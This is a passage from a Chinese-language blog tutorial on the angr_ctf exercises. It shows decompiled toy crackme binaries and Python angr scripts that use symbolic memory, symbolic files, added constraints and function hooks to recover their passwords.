<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/24/20240724-112412.png" alt="image-20240724112412817"></p>
<p>和之前一样跳过输入部分(现版本angr已经支持直接输入 可以按照第1, 2题的方法做 下面一题也是) 并对目标区域进行符号化(其实栈的初始化本质上也是内存区域初始化 可以用一样的方法进行值的符号化) 完整脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;05_angr_symbolic_memory&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    <span class="comment"># state = proj.factory.entry_state()</span></span><br><span class="line">    state = proj.factory.blank_state(addr = <span class="number">0x80485FE</span>)</span><br><span class="line">    bss = <span class="number">0xA1BA1C0</span></span><br><span class="line">    pws = [claripy.BVS(<span class="string">&#x27;pw%d&#x27;</span> % i, <span class="number">64</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="comment"># 对.bss段上的值进行初始化 memory.store()默认使用大端序进行填充 添加参数endness = proj.arch.memory_endness可以强制以程序的端序进行填充</span></span><br><span class="line">        state.memory.store(bss + i * <span class="number">8</span>, pws[i])</span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    simgr.explore(find=is_succ, avoid=is_fail)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        <span class="comment"># print(simgr.found[0].posix.dumps(0))</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="built_in">print</span>(simgr.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(pws[i], cast_to=<span class="built_in">bytes</span>), end = <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Answer not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<h3 id="angr-symbolic-dynamic-memory-内存空间初始化2"><a href="#angr-symbolic-dynamic-memory-内存空间初始化2" class="headerlink" title="angr_symbolic_dynamic_memory | 内存空间初始化2"></a>angr_symbolic_dynamic_memory | 内存空间初始化2</h3><p>如果要符号化的内存区域一开始是不确定的 可以退而求其次不对原本要校验的区域进行符号化 而是更改要校验的区域将其固定下来 这题用<code>malloc()</code>进行内存分配:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp-10h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  buffer0 = <span class="built_in">malloc</span>(<span class="number">9u</span>);</span><br><span class="line">  buffer1 = <span class="built_in">malloc</span>(<span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer0, <span class="number">0</span>, <span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer1, <span class="number">0</span>, <span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s %8s&quot;</span>, buffer0, buffer1, v6);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = &amp;buffer0[i];</span><br><span class="line">    *v3 = complex_function(buffer0[i], i);</span><br><span class="line">    v4 = &amp;buffer1[i];</span><br><span class="line">    *v4 = complex_function(buffer1[i], i + <span class="number">32</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buffer0, <span class="string">&quot;UODXLZBI&quot;</span>, <span class="number">8u</span>) &amp;&amp; !<span class="built_in">strncmp</span>(buffer1, <span class="string">&quot;UAORRAYF&quot;</span>, <span class="number">8u</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(buffer0);</span><br><span class="line">  <span class="built_in">free</span>(buffer1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/24/20240724-113755.png" alt="image-20240724113755497"></p>
<p>malloc分配的内存在<code>.heap</code>堆空间上 和本地变量一样一开始是不确定其地址的 那就直接改变<code>buffer0[1]</code>存放的内存地址:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;06_angr_symbolic_dynamic_memory&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    start = <span class="number">0x08048696</span></span><br><span class="line">    state = proj.factory.blank_state(addr = start)</span><br><span class="line">    p1 = <span class="number">0xABCC8A4</span></span><br><span class="line">    p2 = <span class="number">0xABCC8AC</span></span><br><span class="line">    bss1 = <span class="number">0xABCC890</span></span><br><span class="line">    bss2 = <span class="number">0xABCC880</span></span><br><span class="line">    <span class="comment"># 把原本存放校验值的堆地址改成固定的.bss段上的空闲空间的地址</span></span><br><span class="line">    state.memory.store(p1, bss1, endness=proj.arch.memory_endness)</span><br><span class="line">    state.memory.store(p2, bss2, endness=proj.arch.memory_endness)</span><br><span class="line">    pws = [state.solver.BVS(<span class="string">&#x27;p1&#x27;</span>, <span class="number">8</span>*<span class="number">8</span>), state.solver.BVS(<span class="string">&#x27;p2&#x27;</span>, <span class="number">8</span>*<span class="number">8</span>)]</span><br><span class="line">    state.memory.store(bss1, pws[<span class="number">0</span>])</span><br><span class="line">    state.memory.store(bss2, pws[<span class="number">1</span>])</span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    simgr.explore(find=is_succ, avoid=is_fail)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        <span class="built_in">print</span>(simgr.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(pws[<span class="number">0</span>], cast_to=<span class="built_in">bytes</span>))</span><br><span class="line">        <span class="built_in">print</span>(simgr.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(pws[<span class="number">1</span>], cast_to=<span class="built_in">bytes</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Answer not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<h3 id="angr-symbolic-file-文件内容初始化"><a href="#angr-symbolic-file-文件内容初始化" class="headerlink" title="angr_symbolic_file | 文件内容初始化"></a>angr_symbolic_file | 文件内容初始化</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, buffer);</span><br><span class="line">  ignore_me(buffer, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">  fp = fopen(<span class="string">&quot;OJKSQYDP.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  fread(buffer, <span class="number">1u</span>, <span class="number">0x40</span>u, fp);</span><br><span class="line">  fclose(fp);</span><br><span class="line">  unlink(<span class="string">&quot;OJKSQYDP.txt&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + <span class="number">0x804A0A0</span>) = complex_function(*(<span class="type">char</span> *)(i + <span class="number">0x804A0A0</span>), i);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buffer, <span class="string">&quot;AQWLCTXB&quot;</span>, <span class="number">9u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ignore_me()</code>的作用就是将输入的内容放进文件里保存以防下面读不到文件 这题可以在读取文件内容后开始对<code>buffer</code>初始化(测试后发现甚至可以从头开始执行 angr也能求解出答案) 这里从读取文件开始学习一下文件内容的符号化:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;07_angr_symbolic_file&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    start = <span class="number">0x080488D6</span></span><br><span class="line">    file_name = <span class="string">&#x27;OJKSQYDP.txt&#x27;</span></span><br><span class="line">    file_size = <span class="number">0x40</span></span><br><span class="line">    file_content = claripy.BVS(<span class="string">&#x27;file_content&#x27;</span>, file_size * <span class="number">8</span>)</span><br><span class="line">    <span class="comment"># 创建一个模拟文件以供模拟执行时可以读取</span></span><br><span class="line">    simgr_file = angr.storage.SimFile(file_name, content=file_content, size=file_size)</span><br><span class="line">    state = proj.factory.blank_state(addr = start)</span><br><span class="line">    <span class="comment"># state = proj.factory.entry_state()</span></span><br><span class="line">    <span class="comment"># 插入进程可读取文件的虚拟空间</span></span><br><span class="line">    state.fs.insert(file_name, simgr_file)</span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    simgr.explore(find=is_succ, avoid=is_fail)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        <span class="built_in">print</span>(simgr.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(file_content, cast_to=<span class="built_in">bytes</span>))</span><br><span class="line">        <span class="comment"># print(simgr.found[0].posix.dumps(0))</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Answer not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<h3 id="angr-constraints-手动添加条件"><a href="#angr-constraints-手动添加条件" class="headerlink" title="angr_constraints | 手动添加条件"></a>angr_constraints | 手动添加条件</h3><p>当程序在循环进行多次判断 符号执行时会产生指数级的路径从而发生路径爆炸问题 比如这道题的判断逻辑:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_BOOL4 __cdecl <span class="title function_">check_equals_AUPDNNPROEZRJWKB</span><span class="params">(<span class="type">char</span> *input, <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( input[i] == *(i + <span class="number">0x804A040</span>) )         <span class="comment">// =&gt; input[i] == enc[i]</span></span><br><span class="line">      ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 == len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  qmemcpy(&amp;password, <span class="string">&quot;AUPDNNPROEZRJWKB&quot;</span>, <span class="number">16</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buffer, <span class="number">0</span>, <span class="number">0x11</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%16s&quot;</span>, &amp;buffer);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    *(i + <span class="number">134520912</span>) = complex_function(*(i + <span class="number">0x804A050</span>), <span class="number">15</span> - i);</span><br><span class="line">  <span class="keyword">if</span> ( check_equals_AUPDNNPROEZRJWKB(&amp;buffer, <span class="number">16</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>密文长度为16bytes 也就是循环中对比的次数是16次 加上最后判断是否正确的一次判断 可能的路径达到了<code>2 ^ 17</code>条 如果直接让angr用这个函数进行是否正确的判断肯定会运行很长时间 我们直接在判断前中断程序 让程序进入我们自己设置的限制条件的代码段:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;08_angr_constraints&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    start = <span class="number">0x08048625</span></span><br><span class="line">    buf = <span class="number">0x804A050</span></span><br><span class="line">    state = proj.factory.blank_state(addr = start)</span><br><span class="line">    <span class="comment"># 一定要实例化一个符号化内存的引用出来</span></span><br><span class="line">    ans = state.solver.BVS(<span class="string">&#x27;buf&#x27;</span>, <span class="number">8</span>*<span class="number">16</span>)</span><br><span class="line">    state.memory.store(buf, ans)</span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    simgr.explore(find=<span class="number">0x08048673</span>)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        new_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">        string_after_processed = new_state.memory.load(buf, <span class="number">16</span>)</span><br><span class="line">        <span class="comment"># 和z3的使用一样 添加限制条件</span></span><br><span class="line">        new_state.solver.add(string_after_processed == <span class="string">&quot;AUPDNNPROEZRJWKB&quot;</span>)</span><br><span class="line">        <span class="comment"># 如果上面不实例化ans 直接用进过符号执行后的对应内存区域的话 得到的就是F(x) 而不是x</span></span><br><span class="line">        <span class="built_in">print</span>(new_state.solver.<span class="built_in">eval</span>(ans, cast_to=<span class="built_in">bytes</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Answer not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<h2 id="hook某个函数"><a href="#hook某个函数" class="headerlink" title="hook某个函数"></a>hook某个函数</h2><h3 id="angr-hooks-通过调用地址hook函数"><a href="#angr-hooks-通过调用地址hook函数" class="headerlink" title="angr_hooks | 通过调用地址hook函数"></a>angr_hooks | 通过调用地址hook函数</h3><p>这一题尝试用另一种方式解决路径爆炸问题 像Frida hook一样将会产生路径爆炸的函数替换成自己写的函数</p>
<p>和上一题的对比逻辑差不多 都是一位一位比:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_BOOL4 __cdecl <span class="title function_">check_equals_XYMKBKUHNIQYNQXE</span><span class="params">(<span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(i + a1) == *(i + <span class="number">0x804A044</span>) )</span><br><span class="line">      ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 == a2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BOOL4 v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  qmemcpy(password, <span class="string">&quot;XYMKBKUHNIQYNQXE&quot;</span>, <span class="number">16</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">0x11</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%16s&quot;</span>, buffer);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    *(i + <span class="number">0x804A054</span>) = complex_function(*(i + <span class="number">0x804A054</span>), <span class="number">18</span> - i);</span><br><span class="line">  equals = check_equals_XYMKBKUHNIQYNQXE(buffer, <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">    *(j + <span class="number">0x804A044</span>) = complex_function(*(j + <span class="number">0x804A044</span>), j + <span class="number">9</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%16s&quot;</span>, buffer);</span><br><span class="line">  v3 = equals &amp;&amp; !<span class="built_in">strncmp</span>(buffer, password, <span class="number">0x10</span>u);</span><br><span class="line">  equals = v3;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>0x804A044和0x804A054分别就是password和buffer的地址 检查函数被调用的位置:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080486A9 83 EC 08                      sub     esp, 8</span><br><span class="line">.text:080486AC 6A 10                         push    10h</span><br><span class="line">.text:080486AE 68 54 A0 04 08                push    offset buffer</span><br><span class="line">.text:080486B3 E8 ED FE FF FF                call    check_equals_XYMKBKUHNIQYNQXE</span><br><span class="line">.text:080486B3</span><br><span class="line">.text:080486B8 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:080486BB A3 68 A0 04 08                mov     ds:equals, eax</span><br></pre></td></tr></table></figure>

<p>call语句长度是5bytes 要hook的位置不是函数的开头 是call的位置 同时还需要call指令的长度 hook脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;09_angr_hooks&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    state = proj.factory.entry_state()</span><br><span class="line">    to_hook = <span class="number">0x80486B3</span></span><br><span class="line">    lenth = <span class="number">0x5</span></span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    <span class="comment"># 用工程对象的hook修饰器</span></span><br><span class="line"><span class="meta">    @proj.hook(<span class="params">to_hook, length=lenth</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hook_func</span>(<span class="params">state</span>):    <span class="comment"># 要替换成的函数</span></span><br><span class="line">        to_cmp = state.memory.load(<span class="number">0x804A044</span>, <span class="number">0x10</span>)</span><br><span class="line">        arg = state.memory.load(<span class="number">0x804A054</span>, <span class="number">0x10</span>)</span><br><span class="line">        <span class="comment"># 返回值存在eax中</span></span><br><span class="line">        state.regs.eax = claripy.If(to_cmp == arg, claripy.BVV(<span class="number">1</span>, <span class="number">32</span>), claripy.BVV(<span class="number">0</span>, <span class="number">32</span>))</span><br><span class="line">    simgr.explore(find=is_succ, avoid=is_fail)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        <span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Answer not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<h3 id="angr-simprocedures-通过符号hook函数"><a href="#angr-simprocedures-通过符号hook函数" class="headerlink" title="angr_simprocedures |  通过符号hook函数"></a>angr_simprocedures |  通过符号hook函数</h3><p>当要hook的函数在多处被调用 并且hook的目的是彻底更改函数执行的内容就要对所有的调用地址进行hook 非常麻烦 例如这一题:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/29/20240729-090207.png" alt="image-20240729090200722"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+20h] [ebp-28h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">17</span>]; <span class="comment">// [esp+2Bh] [ebp-1Dh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;password, <span class="string">&quot;ORSDDWXHZURJRBDH&quot;</span>, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%16s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    s[i] = complex_function(s[i], <span class="number">18</span> - i);</span><br><span class="line">  <span class="keyword">if</span> ( check_equals_ORSDDWXHZURJRBDH((<span class="type">int</span>)s, <span class="number">0x10</span>u) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>程序被虚拟控制流混淆(虽然IDA的反汇编可以轻松优化出唯一会执行的路径) 这样就需要对函数的符号进行hook:</p>
